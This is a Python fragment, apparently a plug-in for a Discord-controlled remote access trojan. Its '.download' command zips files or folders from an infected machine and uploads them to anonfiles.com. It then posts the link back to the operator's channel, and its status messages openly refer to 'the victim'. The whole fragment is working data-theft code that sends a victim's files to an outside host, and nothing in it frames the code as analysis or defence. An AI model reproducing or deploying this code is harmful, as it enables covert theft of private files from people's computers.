from shutil import copy2, rmtree
from zipfile import ZipFile
import os
import requests
# end of imports

# on reaction add
elif str(reaction) == '✅':
    if len(messages_from_sending_big_file) > 1:
        for i in messages_from_sending_big_file:
            await i.delete()
        messages_from_sending_big_file = []

# on message
elif message.content[:9] == '.download':
    await message.delete()
    if message.channel.id == channel_ids['file']:
        if message.content == '.download':
            reaction_msg = await message.channel.send('```Syntax: .download <file-or-directory>```'); await reaction_msg.add_reaction('🔴')
        else:
            if os.path.exists('/'.join(working_directory) + '/' + message.content[10:]):
                target_file = '/'.join(working_directory) + '/' + message.content[10:]
                if os.path.isdir(target_file):
                    target_file += '.zip'
                    with ZipFile(target_file,'w') as zip:
                        for file in get_all_file_paths('.'.join(target_file.split('.')[:-1])):
                            try: zip.write(file)
                            except Exception as e:
                                message.channel.send(e)
                                pass
                    await message.channel.send('```Uploading to anonfiles.. this can take a while depending on the file size, amount and the victim\'s internet speed..```')
                    files = {
                        'file': (f'{message.content[10:]}.zip', open(f'{target_file}', 'rb')),
                    }
                    url = 'https://api.anonfiles.com/upload'
                    response = requests.post(url, files=files)
                    data = response.json()
                    await message.channel.send(f"```{message.content[10:]}.zip:``` {data['data']['file']['url']['short']}")

                else:
                    await message.channel.send('```Uploading to anonfiles.. this can take a while depending on the file size and the victim\'s internet speed..```')
                    files = {
                        'file': (f'{message.content[10:]}', open(f'{target_file}', 'rb')),
                    }

                    url = 'https://api.anonfiles.com/upload'
                    response = requests.post(url, files=files)

                    data = response.json()

                    await message.channel.send(f"```{message.content[10:]}:``` {data['data']['file']['url']['short']}")
            else:
                reaction_msg = await message.channel.send('```❗ File or directory not found.```'); await reaction_msg.add_reaction('🔴')
    else:
        reaction_msg = await message.channel.send('_ _\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
